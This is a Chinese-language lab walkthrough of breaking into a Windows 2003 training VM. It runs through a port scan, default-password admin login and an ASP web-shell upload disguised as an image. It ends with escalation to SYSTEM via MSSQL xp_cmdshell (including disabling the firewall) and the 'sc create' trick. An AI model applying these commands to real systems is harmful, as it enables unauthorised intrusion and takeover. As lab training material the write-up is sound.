这是一个某个正在学习安全伙伴告诉我，他老师给他一个靶机让他提权，他不知道怎么下手，让我来试一下，那就试一下

![](../Images/84e699bde0ba5df40f097e1013da9855.png)

知道网段ip没开机密码，他说这个靶机是这样的。

固定ip是 192.168.3.5

是个win2003r2的系统

那就先把虚拟机配置一下

 ![](../Images/2b3656d3601bcd3ce969b8646fa64f72.png)

 

加一个192.168.3.0网段的网络

把第一个网络适配器添加上VMnet2这个网络

![](../Images/c35b61b1406c16210fe0771bdde2fb94.png)

然后在我的kali虚拟机上也添加VMnet2网卡

开机ifconfig看看

![](../Images/8bdd0e77a923a5283048e1d514521a21.png)

添加上了

然后ping一下看能不能ping通![](../Images/fd01457d8209c01382e4b672e75668ba.png)

 能通

用nmap简单扫下服务和端口

好多开放端口

有23端口但是没密码

有445端口用msf搞了一波似乎不行，可能打了补丁

![](../Images/4b3497f79bb400986ed012ddc6306896.png)

上面有好几个站点， 随便选一个默认密码就进后台了

![](../Images/44e4f3362f1ac2965133def84950203b.png)

剩下直接拿shell行了

直接传一张图片马，他后台有个文件改名

![](../Images/3e83cf8b54b13b6ab30a1776710b4f25.png)

通过抓包把文件类型改了，改成图片里面一句话马的执行类型，这个站是asp站，我传的是asp马，所以改的也是asp

ok

链接了上来

![](../Images/88a10fe8989377c1ceae6d1952ae8931.png)

传了个msf马上来执行不了，没有权限

![](../Images/98a608bdc6585bc943368ee478f5dc24.png)

**提权**

尝试通过mssql数据库提权方法

在里面的代码文件找出数据库账号密码

 ![](../Images/57b966fcac56de23b7e315499388569f.png)

账号:sa

密码：admin

看能不能链接

连上了

 ![](../Images/f60b57b0a8401fc5e97058472ba90fda.png)

 

用 exec xp\_cmdshell 执行命令

exec sp\_configure 'show advanced options',1;

RECONFIGURE;

exec sp\_configure 'xp\_cmdshell',1;

RECONFIGURE;

 ![](../Images/42914194cb42f990ce6d2306e604aebc.png)

 

exec xp\_cmdshell 'netsh advfirewall set allprofiles state off';

关闭防火墙

exec xp\_cmdshell 'net user';

查看用户

![](../Images/99a0f08cbabe0799b95297e9d52b9dd3.png)

  

把账户密码改了

 ![](../Images/567695f50e78e8faabf7312c8c6e1863.png)

这下能登录进去了

![](../Images/ab0f5936260c09c1ee3657a49258bfb9.png)

只是administration权限，我需要最高的system权限

![](../Images/dc117cfb3f1909442847bba5fcab90f7.png)

用SC提权方法

sc提权只适合老系统，xp win7 2003这些，其他系统有其他方法

sc Create sys binPath="cmd / c start" type= own type= interact

sc start sys  

虽然提示失败1053 但是最高权限system窗口弹出来了

 ![](../Images/cd487dd3ee1aa15666687ba6f9f1f9db.png)
